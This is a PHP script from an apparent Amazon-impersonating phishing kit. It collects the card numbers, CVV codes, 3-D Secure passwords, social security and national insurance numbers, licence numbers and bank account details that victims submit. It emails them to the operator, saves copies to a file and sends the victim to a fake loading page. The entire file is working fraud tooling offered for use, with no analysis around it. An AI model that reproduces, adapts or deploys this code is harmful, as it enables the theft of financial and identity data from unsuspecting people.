<?php
##############################################################################################################################################################
        session_start();
        include ('../bots.php');
        include ('../config.php');
##############################################################################################################################################################
        $IP = $_SERVER['REMOTE_ADDR'];
        date_default_timezone_set('UTC');
        $DETAILS     = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$IP."");
        $COUNTRYCODE = $DETAILS->geoplugin_countryCode;
        $COUNTRYNAME = $DETAILS->geoplugin_countryName;
        $STRTCODE    = strtolower($COUNTRYCODE);
##############################################################################################################################################################
        $CREDITCARD = $_POST['cc_number'];
        $CSC = $_POST['cvv2_number'];
        $EXMONTH = $_POST['TH3MRXMONTH'];
        $EXYEAR = $_POST['TH3MRXYEAR'];
        $CARDHOLDER = $_POST['cc_holder'];
        $VBV = $_POST['vbv'];
        $SSN = $_POST['ssn'];
        $SIN = $_POST['sin'];
        $NIN = $_POST['nin'];
        $DLN = $_POST['dln'];
        $SC = $_POST['sortcode'];
        $AN = $_POST['an'];
		$BIN     = str_replace(' ', '', $CREDITCARD);
        $BIN     = substr($BIN, 0, 6);
##############################################################################################################################################################
		$MESSAGE="<div style='font-size:13px;font-family:monospace'>";
		$MESSAGE.="<b>DEAR, <font color='#cc1414'>".$PRONAME."</font></b><br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>CARDHOLDER</font></b>      :<b>".$CARDHOLDER."</b><br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>CARDNUMBER</font></b>      :<b>".$CREDITCARD."</b><br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>DATE</font></b>          :<b>".$EXMONTH."/".$EXYEAR."</b><br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>CSC</font></b>             :<b>".$CSC."</b><br>\n";		
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>BIN</font></b>         :<b><a href='https://lookup.binlist.net/$BIN'>CLICK ☑</a></b><br>\n";
		if(isset($VBV) || $VBV != '' ){$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>3D</font></b>          :<b>".$VBV."</b><br>\n";};
		if(isset($SSN) || $SSN != '' ){$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>SSN</font></b>             :<b>".$SSN."</b><br>\n";};
		if(isset($SIN) || $SIN != '' ){$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>SIN</font></b>             :<b>".$SIN."</b><br>\n";};
		if(isset($NIN) || $NIN != '' ){$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>NIN</font></b>             :<b>".$NIN." </b><br>\n";};
		if(isset($DLN) || $DLN != '' ){$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>DLN</font></b>             :<b>".$DLN."</b><br>\n";};
		if(isset($SC) || $SC != '' )  {$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>SORTECODE</font></b>       :<b>".$SC." </b><br>\n";};
		if(isset($AN) || $AN != '' )  {$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>ACCOUNT NUMBER</font></b>  :<b>".$AN." </b><br>\n";};
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>IP</font></b>              :<a href='http://ip-api.com/$IP' target='_blank'>$IP</a><br>";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>COUNTRY</font></b>         : <b>".$COUNTRYNAME." - ".$COUNTRYCODE."</b><br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>BROWSER & OS</font></b>    : <b>".$device_details."</b><br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>TIME</font></b>            : <b>".date('l jS \of F Y h:i:s A')."</b> <br></div>\n";
		$MESSAGE = wordwrap($MESSAGE,70);
##############################################################################################################################################################
        $SUBJECT = "(AMAZON)(CREDITCARD)($IP)($COUNTRYNAME)";
        $HEADER = "MIME-Version: 1.0" . "\r\n";
        $HEADER .= "Content-type:text/html;charset=UTF-8" . "\r\n";
		$HEADER .= "From: MOBILE VERSION ☑ <CARD_$IP>\n";
        mail($TO,$SUBJECT,$MESSAGE,$HEADER);
		$file = fopen("../BB/CREDITCARD_$IP.html","a");
fwrite($file,$MESSAGE);
		$CODED  ="loading.html?cmd=_Please_wait_=".md5(microtime())."&lim_session=".sha1(microtime());
        header("Location: $CODED");
##############################################################################################################################################################
?>